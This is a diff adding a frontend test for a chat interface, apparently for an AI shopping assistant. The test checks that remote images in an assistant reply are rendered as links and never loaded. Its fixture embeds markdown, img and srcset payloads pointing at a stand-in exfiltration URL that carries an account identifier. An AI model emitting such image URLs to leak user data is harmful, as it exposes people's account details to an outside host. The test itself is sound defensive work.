@@ -221,6 +221,33 @@ describe("chat", () => {
     }
   });
 
+  it("never loads a remote image the model writes, in markdown or HTML: it becomes a link", async () => {
+    const exfiltrate = "https://evil.example/collect?d=acct_ada";
+    const text = [
+      "Here is your order.",
+      `![receipt](${exfiltrate})`,
+      `<img src="${exfiltrate}&via=html" alt="pixel">`,
+      `<picture><source srcset="${exfiltrate}&via=source"><img src="/logo.svg" alt="logo"></picture>`
+    ].join("\n\n");
+    const messages: TranscriptMessage[] = [
+      { id: "1", role: "user", parts: [{ type: "text", text: "Show me my receipt" }], timestamp: 1 },
+      { id: "2", role: "assistant", parts: [{ type: "text", text }], timestamp: 2 }
+    ];
+    const { container } = open("/", session({ messages }));
+    await waitFor(() => expect(container.querySelector(`img[alt="logo"]`)).toBeTruthy());
+    // Nothing that would load points anywhere but here.
+    const loads = [...container.querySelectorAll("[src], [srcset]")].flatMap((element) =>
+      ["src", "srcset"].flatMap((name) => (element.hasAttribute(name) ? [element.getAttribute(name)!] : []))
+    );
+    expect(loads.filter((value) => !value.startsWith("data:") && new URL(value, location.href).origin !== location.origin)).toEqual([]);
+    expect(container.innerHTML).not.toMatch(/src(set)?="https:\/\/evil/);
+    // An image of our own still shows.
+    expect(screen.getByRole("img", { name: "logo" }).getAttribute("src")).toBe("/logo.svg");
+    // The remote ones are links the User can choose to follow, never loaded.
+    expect(screen.getByRole("link", { name: "[Image: receipt]" }).getAttribute("href")).toBe(exfiltrate);
+    expect(screen.getByRole("link", { name: "[Image: pixel]" }).getAttribute("href")).toBe(`${exfiltrate}&via=html`);
+  });
+
   it("shows a Poppy tool call as one readable line, with the raw call behind Details", () => {
     const messages: TranscriptMessage[] = [
       { id: "1", role: "user", parts: [{ type: "text", text: "Where's my order?" }], timestamp: 1 },
